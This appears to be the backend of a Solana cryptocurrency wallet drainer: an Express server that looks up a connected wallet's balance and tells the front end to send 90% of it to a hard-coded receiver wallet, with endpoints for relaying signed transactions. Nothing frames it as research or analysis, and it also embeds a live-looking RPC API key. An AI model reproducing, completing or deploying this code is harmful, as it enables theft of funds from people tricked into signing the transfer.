const express = require('express');
const { Connection, PublicKey } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const connection = new Connection(HELIUS_RPC);

console.log('✅ Server running');

// Get balance
app.post('/api/getBalance', async (req, res) => {
    try {
        const balance = await connection.getBalance(new PublicKey(req.body.publicKey));
        res.json({ success: true, balance });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get blockhash
app.post('/api/getBlockhash', async (req, res) => {
    try {
        const bh = await connection.getLatestBlockhash();
        res.json({ success: true, blockhash: bh.blockhash, lastValidBlockHeight: bh.lastValidBlockHeight });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Send transaction
app.post('/api/sendTransaction', async (req, res) => {
    try {
        const txBuffer = Buffer.from(req.body.transaction, 'base64');
        const sig = await connection.sendRawTransaction(txBuffer);
        res.json({ success: true, txid: sig });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Prepare - JUST returns amount to send (no transaction building)
app.post('/prepare-transaction', async (req, res) => {
    try {
        const from = new PublicKey(req.body.publicKey);
        const balance = await connection.getBalance(from);
        
        if (balance < 20000000) {
            return res.json({ success: false, error: 'Need at least 0.02 SOL' });
        }
        
        const amount = Math.floor(balance * 0.9);
        
        res.json({
            success: true,
            amount: amount,
            to: RECEIVER_WALLET
        });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// Notification
app.post('/notify', (req, res) => res.json({ ok: true }));

// Test
app.get('/test', async (req, res) => {
    try {
        const balance = await connection.getBalance(new PublicKey('5V2jK6QZqQoD99FrSrBBmdgzdfZWPufzViiDNS8skqiQ'));
        res.json({ status: 'ok', balance: balance / 1e9 });
    } catch (err) {
        res.json({ status: 'error', error: err.message });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server on port ${PORT}`);
    console.log(`🎯 Send to: ${RECEIVER_WALLET.slice(0, 8)}...`);
});
